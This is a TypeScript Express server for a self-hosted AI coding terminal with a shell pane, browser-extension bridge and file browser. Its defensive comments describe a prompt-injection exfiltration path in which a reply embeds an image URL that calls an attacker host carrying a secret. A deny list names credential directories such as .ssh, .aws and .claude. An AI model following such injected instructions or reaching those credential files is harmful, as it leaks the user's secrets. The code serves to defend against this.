import express from "express";
import { WebSocketServer } from "ws";
import { createServer, type IncomingMessage } from "node:http";
import { mkdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { Manager } from "./conversation.js";
import { BrowserBridge } from "./browser.js";
import * as files from "./files.js";
import { pruneScreenshots } from "./screenshots.js";
import { UsageLog } from "./usage.js";
import { WatchRegistry } from "./watches.js";
import { PromptStore, hostOf, fill } from "./prompts.js";
import { resolveProject } from "./projects.js";
import { ZipFile } from "yazl";
import { heartbeat } from "./heartbeat.js";
import { createAuth, AuthRefused, type Auth } from "./auth.js";
import { attachAgent, attachShell, type AttachContext } from "./attach.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, "..");

const HOST = process.env.CODETERM_HOST ?? "127.0.0.1";
const PORT = Number(process.env.CODETERM_PORT ?? 8123);
const WORKSPACE = process.env.CODETERM_WORKSPACE ?? join(ROOT, "workspace");
// The shell pane is already a full shell as this user, so scoping the file
// browser tighter than that would be theatre. Root is configurable; it opens
// in the workspace.
const FILES_ROOT = process.env.CODETERM_FILES_ROOT ?? "/home/dev";
const MAX_UPLOAD = Number(process.env.CODETERM_MAX_UPLOAD ?? 100 * 1024 * 1024);
const MAX_ZIP = Number(process.env.CODETERM_MAX_ZIP ?? 500 * 1024 * 1024);

const EXTRA_ORIGINS = (process.env.CODETERM_ORIGINS ?? "").split(",").map((s) => s.trim()).filter(Boolean);

if (HOST === "0.0.0.0" || HOST === "::") {
  console.error("Refusing to bind all interfaces. /pty is an ungated shell; keep it on the tailnet.");
  process.exit(1);
}
mkdirSync(WORKSPACE, { recursive: true });

/**
 * The file browser opens on the home directory, which holds the credentials
 * that would let someone bill your Claude account or SSH as you. Block those
 * subtrees even though they sit inside the root — a shell can read them, but a
 * one-click download in a browser (and a prompt-injected agent) should not.
 * Extend with CODETERM_DENY (colon-separated absolute paths).
 */
const HOME = process.env.HOME ?? "/home/dev";
const DENY_DEFAULTS = [
  ".claude", ".ssh", ".aws", ".config/gh", ".config/gcloud", ".gnupg",
  ".docker/config.json", ".netrc", ".git-credentials", ".kube",
].map((p) => join(HOME, p));
const DENY_EXTRA = (process.env.CODETERM_DENY ?? "").split(":").map((s) => s.trim()).filter(Boolean);
// The server's own secrets, wherever the project sits.
const DENY_SELF = [join(ROOT, ".env")];
await files.setDeniedPaths([...DENY_DEFAULTS, ...DENY_EXTRA, ...DENY_SELF]);

// The Chrome extension dials in here; browser tools speak through it.
const bridge = new BrowserBridge((line) => console.log(`[ext] ${line}`));

/**
 * State shared across connections by design: the newest shell pane (the agent
 * reads that one) and the most recently attached chat (a new shell opens in
 * its cwd). Lives in one object so the attach loops can update it.
 */
const state: AttachContext["state"] = { lastChat: null, activeShell: null };
const clients = new Set<() => void>();
const lastChatCwd = () => state.lastChat?.cwd ?? WORKSPACE;



// Chats live on disk; only the active one has a running SDK session.
const PROJECTS_ROOT = process.env.CODETERM_PROJECTS_ROOT ?? "/home/dev/projects";
const watches = new WatchRegistry();
const prompts = new PromptStore(process.env.CODETERM_PROMPTS ?? join(ROOT, "prompts.json"));

const convo = new Manager(
  WORKSPACE,
  process.env.CODETERM_CHATS ?? join(ROOT, "chats"),
  PROJECTS_ROOT,
  // prefer is replaced per-chat by LiveChat, which knows its own browser.
  { bridge, getShell: () => state.activeShell, watches, prompts, prefer: () => undefined },
);
convo.onListChanged = () => { for (const f of clients) f(); };

convo.onChatRemoved = (id) => {
  const n = watches.removeForChat(id);
  if (n) console.log(`[watch] dropped ${n} watch(es) with the deleted chat`);
};

/**
 * A watch reported. Wake the chat that set it, if that chat is the one running;
 * otherwise leave it on the list for `watch list` to report.
 */
bridge.onEvent((msg) => {
  if (msg.type !== "watch_fired") return;
  const id = String(msg.watchId ?? "");
  const detail = String(msg.detail ?? "something changed");
  const w = watches.fire(id, detail);
  if (!w) return;
  console.log(`[watch] fired: ${detail}`);
  // Route it to the conversation that set it. If that chat is no longer live
  // the watch stays on the list for `watch list` to report.
  const chat = convo.live(w.chatId);
  if (!chat) { console.log(`[watch] its chat is not live; left on the list`); return; }
  // The detail is page-derived (title/url from the extension), so it goes in
  // the untrusted block rather than inline in the instruction — the same rule
  // composePrompt applies to tab context. The description is the model's own
  // words from when it set the watch.
  chat.watchFired(
    w.description,
    detail,
    `A page watch you set has fired. You were waiting for: ${w.description}. ` +
      `The page's report is in the untrusted block above. Tell the user, briefly. ` +
      `Do not re-set the watch unless asked.`,
  );
});

// Expired and long-fired watches should not clutter the list forever.
setInterval(() => {
  for (const w of watches.sweep()) {
    void bridge.send("watch_stop", { watchId: w.id }).catch(() => {});
  }
}, 60_000).unref();

let auth: Auth;
try {
  auth = await createAuth({
    host: HOST, port: PORT, extraOrigins: EXTRA_ORIGINS,
    forceLocal: process.env.CODETERM_LOCALHOST === "1",
    trustedCidrSpec: process.env.CODETERM_TRUSTED_CIDRS,
    extOrigin: process.env.CODETERM_EXT_ORIGIN,
  });
} catch (e) {
  if (e instanceof AuthRefused) { console.error(e.message); process.exit(1); }
  throw e;
}

const app = express();

/**
 * Content-Security-Policy on every response.
 *
 * The transcript renders model replies as HTML, and model replies are shaped by
 * untrusted page content, so a hostile page can smuggle an instruction that
 * makes a reply embed `![x](http://attacker/px?d=<secret>)`. DOMPurify strips
 * scripts and event handlers, so injected markup cannot run code — it can only
 * auto-load a subresource. Locking img/media/font/connect to our own origin
 * closes that exfiltration channel: an off-origin pixel simply never fires.
 *
 *   img/media  'self' data: blob:  — same-origin assets, inline data URIs, and
 *                                    the blob: URLs the file viewer builds
 *   connect    'self'              — the /ws and /pty sockets are same-origin;
 *                                    an injected fetch to attacker.example dies
 *   script     'unsafe-inline'     — the pages carry one inline bootstrap each;
 *                                    every real dependency is a same-origin
 *                                    /vendor file, so this only permits our own
 *                                    inline block, not injected script (which
 *                                    DOMPurify already removes)
 */
const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "media-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "frame-src 'none'",
  "base-uri 'none'",
  "form-action 'self'",
].join("; ");

app.use((_req, res, next) => {
  res.setHeader("Content-Security-Policy", CSP);
  res.setHeader("X-Content-Type-Options", "nosniff");
  // same-origin, not no-referrer: manage.html reads document.referrer to send a
  // phone back to /m.html, and that is a same-origin hop. Cross-origin
  // navigations still leak nothing.
  res.setHeader("Referrer-Policy", "same-origin");
  next();
});

/**
 * Same two checks as a WebSocket upgrade. Static assets stay open — they are
 * inert without a session — but anything touching the filesystem does not.
 */
const guard: express.RequestHandler = (req, res, next) => {
  auth.denyReason(req).then((deny) => {
    if (!deny) return next();
    console.warn(`[deny] ${req.method} ${req.path} — ${deny}`);
    res.status(403).json({ error: deny });
  }).catch((e) => res.status(500).json({ error: String(e) }));
};

/**
 * Which prompts apply right now. The active tab is resolved here rather than
 * in the client, so the plain web UI — which has no idea what your browser is
 * showing — gets the same domain-scoped list as the side panel.
 */
/**
 * Chat management over HTTP, for the manage page. The websocket carries the
 * live list for the running UI; this is for curation, which does not need a
 * session open.
 */
app.get("/chats", guard, (_req, res) => {
  res.json({ projects: convo.projects(), chats: convo.list() });
});

/** One chat's transcript, so the manage page is not renaming things blind. */
app.get("/chats/:id", guard, (req, res) => {
  const rec = convo.read(String(req.params.id));
  if (!rec) { res.status(404).json({ error: "no such chat" }); return; }
  res.json(rec);
});

app.post("/chats/:id", guard, express.json({ limit: "64kb" }), async (req, res) => {
  try {
    const id = String(req.params.id);
    const b = req.body as { title?: string; project?: string; open?: boolean };
    if (typeof b.title === "string") {
      const chat = convo.get(id);
      if (!chat?.rename(b.title)) throw new Error("no such chat");
    }
    if (typeof b.project === "string") {
      const chat = convo.get(id);
      if (!chat) throw new Error("no such chat");
      await chat.setProject(resolveProject(convo.projects(), b.project));
    }
    // "open in the terminal": a fresh attach lands on the newest chat, so make
    // this one the newest. The flag used to be accepted and ignored, and the
    // redirect landed on whichever chat happened to be most recent.
    if (b.open === true) {
      const chat = convo.get(id);
      if (!chat) throw new Error("no such chat");
      chat.touch();
    }
    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

app.delete("/chats/:id", guard, async (req, res) => {
  try {
    convo.remove(String(req.params.id));
    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

/* Which controls actually get used. Local file, never leaves this box; it
   exists so the navigation bar can be ordered from measurement next time
   rather than from priors. */
const usage = new UsageLog(new URL("../usage.json", import.meta.url).pathname);

app.post("/usage", guard, express.json({ limit: "1kb" }), (req, res) => {
  res.json({ ok: usage.record(String((req.body as { control?: unknown })?.control ?? "")) });
});

app.get("/usage", guard, (_req, res) => {
  res.json({ counts: usage.counts() });
});

app.get("/projects", guard, (_req, res) => {
  res.json({ projects: convo.projects() });
});

app.get("/prompts", guard, async (_req, res) => {
  const tab = (await bridge.activeTab()) ?? {};
  const host = hostOf(tab.url);
  res.json({
    host,
    url: tab.url ?? "",
    title: tab.title ?? "",
    hasSelection: Boolean(tab.selection),
    prompts: prompts.for(host).map((p) => ({ ...p, filled: fill(p.text, tab) })),
    all: prompts.all(),
  });
});

app.post("/prompts", guard, express.json({ limit: "256kb" }), (req, res) => {
  try {
    const b = req.body as { id?: string; title?: string; text?: string; domains?: string[] };
    res.json(prompts.upsert({ id: b.id, title: String(b.title ?? ""), text: String(b.text ?? ""), domains: b.domains ?? [] }));
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

app.delete("/prompts/:id", guard, (req, res) => {
  res.json({ removed: prompts.remove(String(req.params.id)) });
});

app.get("/files/info", guard, async (_req, res) => {
  // Where the browser should open: the agent's workspace when it sits under
  // the browsable root, else the root itself.
  let start = "";
  try { start = files.toRel(FILES_ROOT, await files.safePath(FILES_ROOT, WORKSPACE)); } catch { start = ""; }
  res.json({ root: FILES_ROOT, start, maxUpload: MAX_UPLOAD, cwd: lastChatCwd() });
});

app.get("/files/list", guard, async (req, res) => {
  try {
    res.json(await files.list(FILES_ROOT, typeof req.query.path === "string" ? req.query.path : undefined));
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

app.get("/files/read", guard, async (req, res) => {
  try {
    const path = String(req.query.path ?? "");
    const f = await files.statFile(FILES_ROOT, path);
    if (req.query.preview === "1") {
      const t = await files.readTextPreview(f.abs, 256 * 1024);
      res.json(t ? { kind: "text", name: f.name, ...t } : { kind: "binary", name: f.name, bytes: f.size });
      return;
    }
    // Let the browser name the download; the client also sets its own.
    res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(f.name)}"`);
    res.setHeader("Content-Length", String(f.size));
    files.streamFile(f.abs).pipe(res);
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

/**
 * Zip a selection. Streamed straight to the response rather than written to a
 * temp file: the whole point is to hand over a large selection, and nothing
 * needs it on disk.
 */
app.post("/files/zip", guard, express.json({ limit: "256kb" }), async (req, res) => {
  try {
    const b = req.body as { path?: string; names?: string[] };
    const names = Array.isArray(b.names) ? b.names.filter((n) => typeof n === "string") : [];
    if (!names.length) throw new Error("nothing selected");

    const { entries, bytes } = await files.collectForZip(FILES_ROOT, b.path, names, MAX_ZIP);
    if (!entries.length) throw new Error("nothing to zip — the selection held no files");

    const stem = names.length === 1 ? names[0].replace(/\W+/g, "-") : "selection";
    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="${stem}.zip"`);
    console.log(`[zip] ${entries.length} file(s), ${(bytes / 1024).toFixed(0)}KB`);

    const zip = new ZipFile();
    for (const e of entries) zip.addFile(e.abs, e.name);
    zip.outputStream.pipe(res);
    zip.end();
  } catch (e) {
    // If the stream already started, a JSON error would corrupt the zip.
    if (res.headersSent) { res.destroy(); return; }
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

// Streamed to disk. express.raw() held the whole body in memory — up to
// MAX_UPLOAD (100 MB) per request — which is the same OOM shape as the old
// file preview, just on the write side.
app.post("/files/upload", guard, async (req, res) => {
  try {
    const name = String(req.query.name ?? "");
    const dir = typeof req.query.path === "string" ? req.query.path : undefined;
    if (!name) throw new Error("missing ?name=");
    res.json(await files.saveUploadStream(FILES_ROOT, dir, name, req, MAX_UPLOAD));
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

/* The mobile page shares the side panel's script and stylesheet verbatim.
   MV3 forbids remote code, so the extension must load them from disk — serving
   those same two files here keeps mobile and the panel from drifting apart
   instead of maintaining a second copy. */
app.get("/m/app.js", (_req, res) => res.type("js").sendFile(join(ROOT, "extension/sidepanel.js")));
app.get("/m/panel.css", (_req, res) => res.type("css").sendFile(join(ROOT, "extension/panel.css")));
/* Bare /m is what you type on a phone. */
app.get("/m", (_req, res) => res.redirect(302, "/m.html"));

app.use(express.static(join(ROOT, "public")));
app.use("/vendor/xterm", express.static(join(ROOT, "node_modules/@xterm/xterm")));
app.use("/vendor/addon-fit", express.static(join(ROOT, "node_modules/@xterm/addon-fit")));
app.use("/vendor/addon-web-links", express.static(join(ROOT, "node_modules/@xterm/addon-web-links")));
app.use("/vendor/marked", express.static(join(ROOT, "node_modules/marked/lib")));
app.use("/vendor/dompurify", express.static(join(ROOT, "node_modules/dompurify/dist")));

const server = createServer(app);
// Default maxPayload is 100 MB, JSON.parsed in one go. The largest legitimate
// frame is a screenshot data URL over /ext (a few MB); 32 MB leaves headroom.
const wss = new WebSocketServer({ noServer: true, maxPayload: 32 * 1024 * 1024 });

server.on("upgrade", async (req, socket, head) => {
  const route = new URL(req.url ?? "/", `http://${req.headers.host}`).pathname;
  if (route !== "/ws" && route !== "/pty" && route !== "/ext") {
    socket.write("HTTP/1.1 404 Not Found\r\n\r\n");
    socket.destroy();
    return;
  }

  const deny = await auth.denyReason(req);
  if (deny) {
    console.warn(`[deny] ${route} — ${deny}`);
    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
    socket.destroy();
    return;
  }

  wss.handleUpgrade(req, socket, head, (ws) => {
    heartbeat(ws);
    if (route === "/ws") attachAgent(ws, ctx, new URL(req.url ?? "/", "http://x").searchParams.get("observe") !== "1");
    else if (route === "/ext") bridge.attach(ws);
    else attachShell(ws, ctx);
  });
});

const ctx: AttachContext = { convo, bridge, filesRoot: FILES_ROOT, workspace: WORKSPACE, clients, state };

/**
 * At boot this can start before tailscaled has assigned the address, and
 * binding a not-yet-existent IP fails with EADDRNOTAVAIL. Retry rather than
 * die, so the unit does not need to guess at ordering — this also covers
 * tailscale restarting or the address changing under us.
 */
function listenWithRetry(attempt = 0): void {
  const onError = (err: NodeJS.ErrnoException) => {
    const retryable = err.code === "EADDRNOTAVAIL" || err.code === "EADDRINUSE";
    if (!retryable) throw err;
    const wait = Math.min(30_000, 1000 * 2 ** Math.min(attempt, 5));
    console.warn(`bind ${HOST}:${PORT} failed (${err.code}); retrying in ${wait / 1000}s`);
    server.removeListener("error", onError);
    setTimeout(() => listenWithRetry(attempt + 1), wait);
  };
  server.once("error", onError);
  server.listen(PORT, HOST, () => {
    server.removeListener("error", onError);
    announce();
  });
}

function announce(): void {
  console.log(`code-terminal  http://${HOST}:${PORT}`);
  for (const line of auth.banner()) console.log(line);
  console.log(`workspace      ${WORKSPACE}`);
  console.log(`shell          /pty — real PTY, NO approval gate`);
  console.log(`browser        /ext — extension bridge, tools ungated`);
  console.log(`files          ${FILES_ROOT} (browse, upload, download)`);
  console.log(`projects       ${PROJECTS_ROOT}`);
}

// A restart is a good moment to drop what the previous run left behind.
void pruneScreenshots().then((n) => { if (n) console.log(`[shots] pruned ${n} old screenshots`); });

listenWithRetry();
